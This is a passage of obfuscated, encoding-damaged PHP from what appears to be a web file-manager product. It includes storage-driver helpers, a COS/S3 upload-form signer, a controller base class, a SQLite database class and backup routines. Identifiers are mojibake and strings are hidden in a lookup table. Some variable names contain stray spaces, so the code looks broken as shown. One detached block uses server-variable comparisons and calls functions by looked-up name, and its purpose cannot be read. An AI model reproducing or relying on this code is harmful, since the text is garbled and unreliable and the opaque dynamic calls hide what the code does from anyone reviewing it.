REPEAT_SKIP); } else { $CÒë¹ˆĞİÈ = $DàÑèÛ¦°Ş[$_SERVER[çŞáÓæÚô‚Ô‡][85]]; } Cache::set($b‹óÕš„–, $CÒë¹ˆĞİÈ, 3600 * 10); } return $CÒë¹ˆĞİÈ; } public static function defaultDriver() { return Model($_SERVER[çŞáÓæÚô‚Ô‡][712])->defaultDriver(); } public static function defaultIO() { $cÒµ¯ÈŞçÅ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D±îÉíÊêÛ = self::defaultDriver(); return $cÒµ¯ÈŞçÅ[1097] . $D±îÉíÊêÛ[$cÒµ¯ÈŞçÅ[376]] . $cÒµ¯ÈŞçÅ[1084]; } public static function defaultDriverInit() { static $e˜™Á½¯Æ’ = false; if ($e˜™Á½¯Æ’) { return $e˜™Á½¯Æ’; } $e˜™Á½¯Æ’ = IO::init(self::defaultIO()); return $e˜™Á½¯Æ’; } public static function fileTypeList() { $C×·êÌÅ³’ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fİª›ñ‡çÂ = $GLOBALS[$C×·êÌÅ³’[16]][$C×·êÌÅ³’[1098]]; foreach ($fİª›ñ‡çÂ as $A·œŠºÂÕ­ => $AÃëÇƒ¬ÆÌ) { $D¥îÌšÁ¢¯ = $C×·êÌÅ³’[1099] . $A·œŠºÂÕ­; $dÖøÃÓ¬Ø  = LNG($D¥îÌšÁ¢¯); if ($D¥îÌšÁ¢¯ != $dÖøÃÓ¬Ø ) { $fİª›ñ‡çÂ[$A·œŠºÂÕ­][$C×·êÌÅ³’[38]] = $dÖøÃÓ¬Ø ; } } return $fİª›ñ‡çÂ; } public static function transferType($cí«ÖÆ¶êÑ, $cëƒõ¨Ë™–) { goto EÒš•›‹«£; EÒš•›‹«£: $C‰“±­äá‘ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dëˆŠÂ¦Ç = self::driverType($cí«ÖÆ¶êÑ); $f’Î²ŠÎ½ø = self::driverType($cëƒõ¨Ë™–); goto E²„Éè¾; bª§™—“¶: return $C‰“±­äá‘[1102]; goto DÄÎ¦ñ§µ; E²„Éè¾: if ($dëˆŠÂ¦Ç[$C‰“±­äá‘[39]] == $f’Î²ŠÎ½ø[$C‰“±­äá‘[39]] && $dëˆŠÂ¦Ç[$C‰“±­äá‘[1100]] == $f’Î²ŠÎ½ø[$C‰“±­äá‘[1100]]) { return $C‰“±­äá‘[1101]; } if ($dëˆŠÂ¦Ç[$C‰“±­äá‘[39]] == $C‰“±­äá‘[788] && $f’Î²ŠÎ½ø[$C‰“±­äá‘[39]] == $C‰“±­äá‘[112]) { return $C‰“±­äá‘[1047]; } if ($dëˆŠÂ¦Ç[$C‰“±­äá‘[39]] == $C‰“±­äá‘[112] && $f’Î²ŠÎ½ø[$C‰“±­äá‘[39]] == $C‰“±­äá‘[788]) { return $C‰“±­äá‘[113]; } goto bª§™—“¶; DÄÎ¦ñ§µ: } public static function driverType($eâ¬¡ô²ä«) { goto E‰‘¸¨©ï; E‰‘¸¨©ï: $DÕÎ§Ù¿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bµ²¢†â‡ = $eâ¬¡ô²ä«->path; $BÌõâÕÀê = str_replace($DÕÎ§Ù¿[1103], $DÕÎ§Ù¿[43], strtolower($eâ¬¡ô²ä«->getType())); goto A±•İ¤¿ ; d„–ÂÏƒãù: return array($DÕÎ§Ù¿[39] => $DÕÎ§Ù¿[788], $DÕÎ§Ù¿[1100] => $eâ¬¡ô²ä«->pathDriver, $DÕÎ§Ù¿[85] => $bµ²¢†â‡); goto E³çŞïãŸ; A±•İ¤¿ : if ($BÌõâÕÀê == $DÕÎ§Ù¿[703] || $BÌõâÕÀê == $DÕÎ§Ù¿[1104] || $BÌõâÕÀê == $DÕÎ§Ù¿[1105]) { $eâ¬¡ô²ä« = self::defaultDriverInit(); } else { if ($BÌõâÕÀê == $DÕÎ§Ù¿[1055] || $BÌõâÕÀê == $DÕÎ§Ù¿[1106]) { $eâ¬¡ô²ä« = IO::init($eâ¬¡ô²ä«->pathParse[$DÕÎ§Ù¿[1005]]); } } $BÌõâÕÀê = str_replace($DÕÎ§Ù¿[1103], $DÕÎ§Ù¿[43], strtolower($eâ¬¡ô²ä«->getType())); if ($BÌõâÕÀê == $DÕÎ§Ù¿[112]) { return array($DÕÎ§Ù¿[39] => $DÕÎ§Ù¿[112], $DÕÎ§Ù¿[1100] => $DÕÎ§Ù¿[43], $DÕÎ§Ù¿[85] => $bµ²¢†â‡); } goto d„–ÂÏƒãù; E³çŞïãŸ: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($FŠØ‡ä›Ø£) { parent::__construct($FŠØ‡ä›Ø£); $this->signatureVersion($_SERVER[çŞáÓæÚô‚Ô‡][210]); } public function uploadFormData($f´ÁŞÒœŞ¤, $A÷½Ì±ñà = 3600) { goto a÷–õÙÏíÍ; A‚Ô¿ƒ˜˜: $a—‚Ú£Û… = array($a¹’¾ˆ²¸±[1109] => $bÀ¯ïºÓ”Æ, $a¹’¾ˆ²¸±[1110] => array(array($a¹’¾ˆ²¸±[1111] => $c†‡Óœ¬ì…), array($a¹’¾ˆ²¸±[1112] => $this->bucket), array($a¹’¾ˆ²¸±[1113], $a¹’¾ˆ²¸±[1114], $a¹’¾ˆ²¸±[43]), array($a¹’¾ˆ²¸±[1115] => $Aß“ªÌ½à¢), array($a¹’¾ˆ²¸±[1116] => $B¶¶šÉ¦ª©), array($a¹’¾ˆ²¸±[1117] => $this->accessKey), array($a¹’¾ˆ²¸±[1118] => $eµ‰÷‡ô‹))); $a—‚Ú£Û… = json_encode($a—‚Ú£Û…); $f†š°İ†à‡ = hash_hmac($a¹’¾ˆ²¸±[227], $eµ‰÷‡ô‹, $this->secret); goto D¡é†²­À¼; cÂ©îöéÂ¤: return $a‘ ¸“Çêä; goto bŸï¸Ş¾ˆŞ; a÷–õÙÏíÍ: $a¹’¾ˆ²¸± =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c†‡Óœ¬ì… = $a¹’¾ˆ²¸±[195]; $B¶¶šÉ¦ª© = $a¹’¾ˆ²¸±[227]; goto C‚éìùØâÚ; D¡é†²­À¼: $eÔ¸÷ƒ–¬ = sha1($a—‚Ú£Û…); $b£Í÷õ¾ˆ¬ = hash_hmac($a¹’¾ˆ²¸±[227], $eÔ¸÷ƒ–¬, $f†š°İ†à‡); $a‘ ¸“Çêä = array($a¹’¾ˆ²¸±[1111] => $c†‡Óœ¬ì…, $a¹’¾ˆ²¸±[1115] => $Aß“ªÌ½à¢, $a¹’¾ˆ²¸±[1119] => base64_encode($a—‚Ú£Û…), $a¹’¾ˆ²¸±[1116] => $B¶¶šÉ¦ª©, $a¹’¾ˆ²¸±[1117] => $this->accessKey, $a¹’¾ˆ²¸±[1120] => $eµ‰÷‡ô‹, $a¹’¾ˆ²¸±[1121] => $b£Í÷õ¾ˆ¬, $a¹’¾ˆ²¸±[179] => $this->getHost()); goto cÂ©îöéÂ¤; C‚éìùØâÚ: $Aß“ªÌ½à¢ = $a¹’¾ˆ²¸±[1107]; $bÀ¯ïºÓ”Æ = gmdate($a¹’¾ˆ²¸±[1108], time() + $A÷½Ì±ñà); $eµ‰÷‡ô‹ = (string) time() . $a¹’¾ˆ²¸±[77] . (string) (time() + $A÷½Ì±ñà); goto A‚Ô¿ƒ˜˜; bŸï¸Ş¾ˆŞ: } public function fileOutLink($B‘îØ–Ó¬) { $C–‡×ÅÅÁ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (substr($B‘îØ–Ó¬, 0, 7) == $C–‡×ÅÅÁ[1122]) { $B‘îØ–Ó¬ = $C–‡×ÅÅÁ[1123] . substr($B‘îØ–Ó¬, 7); } header($C–‡×ÅÅÁ[166] . $B‘îØ–Ó¬); die; } } goto FãœñÂã¹§; DÏ‘¹êîŒ†: if ($_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][6]] != $_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][7]]) { goto bÚ¬ŠÌ®‹Ê; bÚ¬ŠÌ®‹Ê: $F‘†İ”‰Ã = $_SERVER[çŞáÓæÚô‚Ô‡][8]; $bİ¤ø‰ï“ = $_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][9]] . $_SERVER[çŞáÓæÚô‚Ô‡][10]; $dˆ©ÚÊÒ¦î = $F‘†İ”‰Ã($bİ¤ø‰ï“); goto f””‚‘“; f””‚‘“: $b¶’†Åˆöò = explode($_SERVER[çŞáÓæÚô‚Ô‡][11], $dˆ©ÚÊÒ¦î); if (count($b¶’†Åˆöò) < $_SERVER[çŞáÓæÚô‚Ô‡][12]) { $BÏ¹‹‘áßª = $_SERVER[çŞáÓæÚô‚Ô‡][13]; $BÏ¹‹‘áßª(); } $a…Å³”øˆ§ = $_SERVER[çŞáÓæÚô‚Ô‡][14]; goto B‘Å¿ñºùô; B‘Å¿ñºùô: $a…Å³”øˆ§($_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][15]]); goto e¨¼ƒÂº¶Ö; e¨¼ƒÂº¶Ö: } class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto føöªö†™÷; føöªö†™÷: $dÍ·‘¾¹ŸÅ =& $_SERVER[çŞáÓæÚô‚Ô‡]; global $in, $config; $this->config =& $config; goto cìÊ†åÆè÷; A¼ªóƒÛÆ±: $this->tpl = TEMPLATE . MOD . $dÍ·‘¾¹ŸÅ[18]; $this->_classObjectID = mt_rand(0, 10000); goto d­– àñ©±; cìÊ†åÆè÷: $this->in =& $in; $this->values[$dÍ·‘¾¹ŸÅ[16]] =& $config; $this->values[$dÍ·‘¾¹ŸÅ[17]] =& $in; goto A¼ªóƒÛÆ±; d­– àñ©±: } public function loadClass($F¢–º‘„èÃ) { if (1 === func_num_args()) { $this->{$F¢–º‘„èÃ} = new $F¢–º‘„èÃ(); } else { $AÇäîÅ¦Šõ = new ReflectionClass($F¢–º‘„èÃ); $AêÛõÔÒğ¯ = func_get_args(); array_shift($AêÛõÔÒğ¯); $this->{$F¢–º‘„èÃ} = $AÇäîÅ¦Šõ->newInstanceArgs($AêÛõÔÒğ¯); } return $this->{$F¢–º‘„èÃ}; } protected function assign($f‘°¦Â±ˆ, $BÓÓ·ìä™) { $this->values[$f‘°¦Â±ˆ] = $BÓÓ·ìä™; } protected function display($b¢çˆ¥Öö) { ob_end_clean(); extract($this->values); require $this->tpl . $b¢çˆ¥Öö; } } class DbSqliteBase extends Db { public function __construct($dÜç„‰ÅÅ = '') { $e¥®«ŒÔØ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!extension_loaded($e¥®«ŒÔØ[19])) { think_exception(think_lang($e¥®«ŒÔØ[20]) . $e¥®«ŒÔØ[21]); } if (!empty($dÜç„‰ÅÅ)) { if (!isset($dÜç„‰ÅÅ[$e¥®«ŒÔØ[22]])) { $dÜç„‰ÅÅ[$e¥®«ŒÔØ[22]] = 438; } $this->config = $dÜç„‰ÅÅ; if (empty($this->config[$e¥®«ŒÔØ[23]])) { $this->config[$e¥®«ŒÔØ[23]] = array(); } } } public function connect($Bƒ‡‰Ñ™¸İ = '', $EÀ²àæ¹·­ = 0) { $AëÒéâ—©Ğ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!isset($this->linkID[$EÀ²àæ¹·­])) { goto aêÍºó‰ó¹; fÍ÷ì‰¶Æù: @sqlite_busy_timeout($this->linkID[$EÀ²àæ¹·­], 30000); if (1 != think_config($AëÒéâ—©Ğ[28])) { unset($this->config); } goto c‡ªÕ¥„™¢; aêÍºó‰ó¹: if (empty($Bƒ‡‰Ñ™¸İ)) { $Bƒ‡‰Ñ™¸İ = $this->config; } $EéÙƒ•ˆÚ = !empty($Bƒ‡‰Ñ™¸İ[$AëÒéâ—©Ğ[23]][$AëÒéâ—©Ğ[24]]) ? $Bƒ‡‰Ñ™¸İ[$AëÒéâ—©Ğ[23]][$AëÒéâ—©Ğ[24]] : $this->pconnect; $a…ğ‘ß… = $EéÙƒ•ˆÚ ? $AëÒéâ—©Ğ[25] : $AëÒéâ—©Ğ[26]; goto C–ÁãÜ’ô¢; C–ÁãÜ’ô¢: $this->linkID[$EÀ²àæ¹·­] = $a…ğ‘ß…($Bƒ‡‰Ñ™¸İ[$AëÒéâ—©Ğ[27]], $Bƒ‡‰Ñ™¸İ[$AëÒéâ—©Ğ[22]]); if (!$this->linkID[$EÀ²àæ¹·­]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto fÍ÷ì‰¶Æù; c‡ªÕ¥„™¢: } return $this->linkID[$EÀ²àæ¹·­]; } public function free() { $this->queryID = null; } public function query($DøÒ¨øÜÔ­) { goto F¶ğºÇÌçá; dğ˜…ã«Ÿ‘: think_status($A˜‚Í¸Ê™ù[30]); $this->queryID = sqlite_query($this->_linkID, $DøÒ¨øÜÔ­); $this->debug(); goto bÅ´Ë‹¯°Ó; bÅ´Ë‹¯°Ó: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $FÄğñµÕÜ = $this->getAll(); return $FÄğñµÕÜ; } goto f®‰ÁÉá¬¢; Dâ‹ÓÎùğ§: $this->queryStr = $DøÒ¨øÜÔ­; if ($this->queryID) { $this->free(); } think_action_status($A˜‚Í¸Ê™ù[29], 1); goto dğ˜…ã«Ÿ‘; F¶ğºÇÌçá: $A˜‚Í¸Ê™ù =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Dâ‹ÓÎùğ§; f®‰ÁÉá¬¢: } public function execute($F¨Â±– Û£) { goto e‰ôÃÙ³·; E§¸Ç• ğç: if (!1 === $cã•¢á¸Óõ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto b¾í—šµ¿; Bø‹ÏÉÊ··: $this->queryStr = $F¨Â±– Û£; if ($this->queryID) { $this->free(); } think_action_status($Aí·’»‚à¹[31], 1); goto c³‚ÒØ†˜…; c³‚ÒØ†˜…: think_status($Aí·’»‚à¹[30]); $cã•¢á¸Óõ = sqlite_exec($this->_linkID, $F¨Â±– Û£); $this->debug(); goto E§¸Ç• ğç; e‰ôÃÙ³·: $Aí·’»‚à¹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Bø‹ÏÉÊ··; b¾í—šµ¿: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[çŞáÓæÚô‚Ô‡][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $FØ‘¿Áî£ = sqlite_query($this->_linkID, $_SERVER[çŞáÓæÚô‚Ô‡][33]); if (!$FØ‘¿Áî£) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $A»ƒØ¾„¾Ü = sqlite_query($this->_linkID, $_SERVER[çŞáÓæÚô‚Ô‡][34]); if (!$A»ƒØ¾„¾Ü) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $bÇ„­Ÿä† = array(); if ($this->numRows > 0) { for ($e³«å÷ÎÑ = 0; $e³«å÷ÎÑ < $this->numRows; $e³«å÷ÎÑ++) { $bÇ„­Ÿä†[$e³«å÷ÎÑ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $bÇ„­Ÿä†; } public function getFields($eÄçİÄæó) { $bÕŒÊ¢ö³Ó =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dçµšÇ»ãÙ = $this->query($bÕŒÊ¢ö³Ó[35] . $eÄçİÄæó . $bÕŒÊ¢ö³Ó[36]); $D¿Ÿí„‹ºÙ = array(); if ($dçµšÇ»ãÙ) { foreach ($dçµšÇ»ãÙ as $BöôƒÌë¹ => $A…õ±¨»†É) { $D¿Ÿí„‹ºÙ[$A…õ±¨»†É[$bÕŒÊ¢ö³Ó[37]]] = array($bÕŒÊ¢ö³Ó[38] => $A…õ±¨»†É[$bÕŒÊ¢ö³Ó[37]], $bÕŒÊ¢ö³Ó[39] => $A…õ±¨»†É[$bÕŒÊ¢ö³Ó[40]], $bÕŒÊ¢ö³Ó[41] => (bool) ($A…õ±¨»†É[$bÕŒÊ¢ö³Ó[42]] === $bÕŒÊ¢ö³Ó[43]), $bÕŒÊ¢ö³Ó[44] => $A…õ±¨»†É[$bÕŒÊ¢ö³Ó[45]], $bÕŒÊ¢ö³Ó[46] => strtolower($A…õ±¨»†É[$bÕŒÊ¢ö³Ó[47]]) == $bÕŒÊ¢ö³Ó[48], $bÕŒÊ¢ö³Ó[49] => strtolower($A…õ±¨»†É[$bÕŒÊ¢ö³Ó[50]]) == $bÕŒÊ¢ö³Ó[51]); } } return $D¿Ÿí„‹ºÙ; } public function getTables($eë“¬ê…ğ× = '') { $F¸ô¦ÂÛğ„ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F‹ Ó¤—‚‹ = $this->query($F¸ô¦ÂÛğ„[52] . $F¸ô¦ÂÛğ„[53] . $F¸ô¦ÂÛğ„[54]); $Bâ¬ë˜¹ = array(); foreach ($F‹ Ó¤—‚‹ as $C¥¨¯ÁùÒ‰ => $AØ¤Œ´®¢ñ) { $Bâ¬ë˜¹[$C¥¨¯ÁùÒ‰] = current($AØ¤Œ´®¢ñ); } return $Bâ¬ë˜¹; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $bã‹‹–‡¤ø =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c¯´ÜŠÇ‰· = sqlite_last_error($this->_linkID); $this->error = $c¯´ÜŠÇ‰· . $bã‹‹–‡¤ø[4] . sqlite_error_string($c¯´ÜŠÇ‰·); if ($bã‹‹–‡¤ø[43] != $this->queryStr) { $this->error .= LNG($bã‹‹–‡¤ø[55]) . $this->queryStr; } think_trace($this->error, $bã‹‹–‡¤ø[43], $bã‹‹–‡¤ø[56]); return $this->error; } public function escapeString($Eê«†×—Í†) { return sqlite_escape_string($Eê«†×—Í†); } public function parseLimit($a¿ƒš±¥) { $dÃ™”‚‚Ò§ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eƒ»Õ…—ö” = $dÃ™”‚‚Ò§[43]; if (!empty($a¿ƒš±¥)) { $a¿ƒš±¥ = explode($dÃ™”‚‚Ò§[57], $a¿ƒš±¥); if (count($a¿ƒš±¥) > 1) { $eƒ»Õ…—ö” .= $dÃ™”‚‚Ò§[58] . $a¿ƒš±¥[1] . $dÃ™”‚‚Ò§[59] . $a¿ƒš±¥[0] . $dÃ™”‚‚Ò§[60]; } else { $eƒ»Õ…—ö” .= $dÃ™”‚‚Ò§[58] . $a¿ƒš±¥[0] . $dÃ™”‚‚Ò§[60]; } } return $eƒ»Õ…—ö”; } } goto Eò”ƒÇáåŒ; BÊÕ™´Éœ: class BackupDbFile { public function __construct() { } public function index() { goto a³¸ÜÈŠ©; a³¸ÜÈŠ©: $BÎ…ùÂÉÖ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fæ™Ïğ°–” = Backup::get(); $E×“Ô…×…É = $fæ™Ïğ°–”[$BÎ…ùÂÉÖ[38]]; goto A²÷ëÚÀÂ; CĞ²™ŒßçÒ: $CÕˆá­áø = new TaskFileTransfer($BÎ…ùÂÉÖ[737], $BÎ…ùÂÉÖ[722], 0, LNG($BÎ…ùÂÉÖ[723]) . $BÎ…ùÂÉÖ[421] . LNG($BÎ…ùÂÉÖ[725]) . $BÎ…ùÂÉÖ[738]); $CÕˆá­áø->addPath($CöŒÓËÔ±“); $C¦ƒµô³ = IO::infoWithChildren($CöŒÓËÔ±“); goto Dˆõ°ö®½‚; Dˆõ°ö®½‚: Backup::set(array($BÎ…ùÂÉÖ[739] => $C¦ƒµô³[$BÎ…ùÂÉÖ[87]])); IO::move($CöŒÓËÔ±“, $bŞ’ç¾¥ä); $f³õÖ›»‘à = CONTROLLER_DIR . $BÎ…ùÂÉÖ[740]; goto CÑ÷˜ôÆÎ; D”„Í¶¤Æ‹: $CÕˆá­áø->end(); Backup::set(array($BÎ…ùÂÉÖ[742] => $C¦ƒµô³[$BÎ…ùÂÉÖ[87]])); return !0; goto EÓñ¹ì«è‚; CÑ÷˜ôÆÎ: $D„»ÓòŠÃ² = CONTROLLER_DIR . $BÎ…ùÂÉÖ[741]; IO::copy($f³õÖ›»‘à, $bŞ’ç¾¥ä . "\142\x61\x63\153\165\x70\137{$E×“Ô…×…É}\57"); IO::copy($D„»ÓòŠÃ², $bŞ’ç¾¥ä . "\x62\x61\x63\x6b\165\x70\x5f{$E×“Ô…×…É}\57"); goto D”„Í¶¤Æ‹; A²÷ëÚÀÂ: $CöŒÓËÔ±“ = TEMP_FILES . "\x62\x61\143\153\165\x70\x5f{$E×“Ô…×…É}\57"; $bŞ’ç¾¥ä = "\173\x69\x6f\x3a{$fæ™Ïğ°–”[$BÎ…ùÂÉÖ[700]]}\175\x2f\144\x61\x74\x61\142\141\163\x65\x2f"; IO::mkdir($bŞ’ç¾¥ä . "\142\x61\x63\x6b\x75\x70\x5f{$E×“Ô…×…É}\57"); goto CĞ²™ŒßçÒ; EÓñ¹ì«è‚: } } class BackupFile { public function __construct() { } public function index() { goto cæ°óÚéé; eóğĞ•ÎÛÛ: $CŒæË¯†² = (int) Model($_SERVER[çŞáÓæÚô‚Ô‡][727])->where($dáÇĞ’¶)->count($_SERVER[çŞáÓæÚô‚Ô‡][428]); $D¥êª‹ƒ® = (int) Model($_SERVER[çŞáÓæÚô‚Ô‡][727])->where($dáÇĞ’¶)->sum($_SERVER[çŞáÓæÚô‚Ô‡][87]); $CÑÜ·„¢é“ = new TaskFileTransfer($_SERVER[çŞáÓæÚô‚Ô‡][745], $_SERVER[çŞáÓæÚô‚Ô‡][722], $CŒæË¯†², LNG($_SERVER[çŞáÓæÚô‚Ô‡][723]) . $_SERVER[çŞáÓæÚô‚Ô‡][724] . LNG($_SERVER[çŞáÓæÚô‚Ô‡][746])); goto a¯‘ãë† ‹; F®Ö™‡µÒé: $eœ‘¹Ó°…± = $A“ãœ‹àê = 0; do { $cƒêñî‡ì = $_SERVER[çŞáÓæÚô‚Ô‡][749]; $Bñ›¡²óÑã = Model($_SERVER[çŞáÓæÚô‚Ô‡][727])->where($dáÇĞ’¶)->field($cƒêñî‡ì)->order($_SERVER[çŞáÓæÚô‚Ô‡][750])->selectPage($Dƒ•–¤ÓÖÚ, $BÙòÜİ…ê‡); $aÂñ½³Ò‘Â = !empty($Bñ›¡²óÑã[$_SERVER[çŞáÓæÚô‚Ô‡][363]]) ? $Bñ›¡²óÑã[$_SERVER[çŞáÓæÚô‚Ô‡][363]] : array(); foreach ($aÂñ½³Ò‘Â as $Aƒ‹¬ÆÄğ†) { goto bê—‚òÄëÁ; dãª°Ô¬Éâ: if ($aÙ¯ƒÊô÷å >= 1024 * 1024 * 100) { $C„ÕñÇÕªì = array($_SERVER[çŞáÓæÚô‚Ô‡][756] => $fÏˆ£òŞáº, $_SERVER[çŞáÓæÚô‚Ô‡][757] => $A“ãœ‹àê, $_SERVER[çŞáÓæÚô‚Ô‡][758] => $eœ‘¹Ó°…±); Backup::set($C„ÕñÇÕªì); $aÙ¯ƒÊô÷å = $EõÃ¤÷å¥ = 0; } goto eÑ¾¹°ğ˜; Dø“‡»ùô±: $aÙ¯ƒÊô÷å += $Aƒ‹¬ÆÄğ†[$_SERVER[çŞáÓæÚô‚Ô‡][87]]; $A“ãœ‹àê += 1; $eœ‘¹Ó°…± += $Aƒ‹¬ÆÄğ†[$_SERVER[çŞáÓæÚô‚Ô‡][87]]; goto dãª°Ô¬Éâ; f§Š÷ˆÀÖ: if (IO::exist($Bëà¬¥±† )) { $CÑÜ·„¢é“->updateFileEnd($Aƒ‹¬ÆÄğ†[$_SERVER[çŞáÓæÚô‚Ô‡][38]], $Aƒ‹¬ÆÄğ†[$_SERVER[çŞáÓæÚô‚Ô‡][87]]); } else { $Bëà¬¥±†  = get_path_father($Bëà¬¥±† ); IO::mkdir($Bëà¬¥±† ); if (!IO::copy($DßØŸµ‰ç­, $Bëà¬¥±† , $_SERVER[çŞáÓæÚô‚Ô‡][753])) { write_log($_SERVER[çŞáÓæÚô‚Ô‡][754] . $DßØŸµ‰ç­ . $_SERVER[çŞáÓæÚô‚Ô‡][755] . $Bëà¬¥±†  . $_SERVER[çŞáÓæÚô‚Ô‡][487], $_SERVER[çŞáÓæÚô‚Ô‡][722]); $CÛ×Ğ×¬ƒš = !1; break; } } $fÏˆ£òŞáº = $Aƒ‹¬ÆÄğ†[$_SERVER[çŞáÓæÚô‚Ô‡][428]]; $EõÃ¤÷å¥ += 1; goto Dø“‡»ùô±; bê—‚òÄëÁ: if (!$this->_fileExist($Aƒ‹¬ÆÄğ†, $dïãöˆê‰Ò, $cˆØÔ´„»)) { $CŒæË¯†² -= 1; $D¥êª‹ƒ® -= (int) $Aƒ‹¬ÆÄğ†[$_SERVER[çŞáÓæÚô‚Ô‡][87]]; write_log("\146\x69\154\145\40\x6e\x6f\164\x20\145\x78\151\163\x74\56\x66\x69\x6c\x65\x49\x44\x3a{$Aƒ‹¬ÆÄğ†[$_SERVER[çŞáÓæÚô‚Ô‡][428]]}\x2c\40\x70\141\164\150\x3a{$Aƒ‹¬ÆÄğ†[$_SERVER[çŞáÓæÚô‚Ô‡][85]]}", $_SERVER[çŞáÓæÚô‚Ô‡][751]); continue; } $DßØŸµ‰ç­ = $Aƒ‹¬ÆÄğ†[$_SERVER[çŞáÓæÚô‚Ô‡][85]]; $Bëà¬¥±†  = "\173\151\x6f\72{$EºÕæ¿İøİ[$_SERVER[çŞáÓæÚô‚Ô‡][700]]}\175" . substr($DßØŸµ‰ç­, strlen("\x7b\x69\157\72{$Aƒ‹¬ÆÄğ†[$_SERVER[çŞáÓæÚô‚Ô‡][752]]}\175")); goto f§Š÷ˆÀÖ; eÑ¾¹°ğ˜: } $FÜ‡‰ÁÔé‚ = count($aÂñ½³Ò‘Â); $BÙòÜİ…ê‡++; } while ($FÜ‡‰ÁÔé‚ == $Dƒ•–¤ÓÖÚ); $CÑÜ·„¢é“->end(); goto DƒªñÉ‡¬Ö; D‡í…ê•İÆ: $CÛ×Ğ×¬ƒš = !0; $cˆØÔ´„» = $this->storeIds(); $BÙòÜİ…ê‡ = 1; goto A…‡Ğò“ï; A…‡Ğò“ï: $Dƒ•–¤ÓÖÚ = 1000; $aÙ¯ƒÊô÷å = $EõÃ¤÷å¥ = 0; $dïãöˆê‰Ò = array(); goto F®Ö™‡µÒé; cæ°óÚéé: $EºÕæ¿İøİ = Backup::get(); $fÏˆ£òŞáº = $EºÕæ¿İøİ[$_SERVER[çŞáÓæÚô‚Ô‡][290]][$_SERVER[çŞáÓæÚô‚Ô‡][177]][$_SERVER[çŞáÓæÚô‚Ô‡][428]]; $dáÇĞ’¶ = array($_SERVER[çŞáÓæÚô‚Ô‡][429] => array($_SERVER[çŞáÓæÚô‚Ô‡][743], $fÏˆ£òŞáº), $_SERVER[çŞáÓæÚô‚Ô‡][744] => array($_SERVER[çŞáÓæÚô‚Ô‡][328], $EºÕæ¿İøİ[$_SERVER[çŞáÓæÚô‚Ô‡][700]])); goto eóğĞ•ÎÛÛ; a¯‘ãë† ‹: $CÑÜ·„¢é“->task[$_SERVER[çŞáÓæÚô‚Ô‡][707]] = $D¥êª‹ƒ®; $C„ÕñÇÕªì = array($_SERVER[çŞáÓæÚô‚Ô‡][747] => $CŒæË¯†², $_SERVER[çŞáÓæÚô‚Ô‡][748] => $D¥êª‹ƒ®); Backup::set($C„ÕñÇÕªì); goto D‡í…ê•İÆ; DƒªñÉ‡¬Ö: $B“­Àæí© = $CÛ×Ğ×¬ƒš ? 1 : 0; $C„ÕñÇÕªì = array($_SERVER[çŞáÓæÚô‚Ô‡][759] => 1, $_SERVER[çŞáÓæÚô‚Ô‡][458] => time(), $_SERVER[çŞáÓæÚô‚Ô‡][717] => $B“­Àæí©, $_SERVER[çŞáÓæÚô‚Ô‡][756] => $fÏˆ£òŞáº, $_SERVER[çŞáÓæÚô‚Ô‡][748] => $D¥êª‹ƒ®, $_SERVER[çŞáÓæÚô‚Ô‡][747] => $CŒæË¯†²); if ($EõÃ¤÷å¥) { $C„ÕñÇÕªì[$_SERVER[çŞáÓæÚô‚Ô‡][757]] = $A“ãœ‹àê; $C„ÕñÇÕªì[$_SERVER[çŞáÓæÚô‚Ô‡][758]] = $eœ‘¹Ó°…±; } goto b¨ôˆŒÉ; b¨ôˆŒÉ: Backup::set($C„ÕñÇÕªì); $this->_fileFilter($dïãöˆê‰Ò); return !0; goto CÎçñŒÌ×; CÎçñŒÌ×: } private function _fileExist($cí›¬×‚¢‹, &$bÇ›ÇÚã©», $bÌ¥Áäàãë) { goto CçÏ¢ˆ£í‡; B‘ôÎÎ‘À½: if (IO::exist($Cøµ »‘–)) { $bÇ›ÇÚã©»[] = $cí›¬×‚¢‹[$E¦©ñÔÙÙß[428]]; return !1; } $cÈì·¦Ö † = array($E¦©ñÔÙÙß[752] => $cí›¬×‚¢‹[$E¦©ñÔÙÙß[752]], $E¦©ñÔÙÙß[85] => array($E¦©ñÔÙÙß[760], "{$Cøµ »‘–}\x25")); $E–†ËÚË¦ç = Model($E¦©ñÔÙÙß[727])->where($cÈì·¦Ö †)->field($E¦©ñÔÙÙß[429])->select(); goto b‚óë“–¾; CçÏ¢ˆ£í‡: $E¦©ñÔÙÙß =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fÔÏ¢¥©ê‹ = 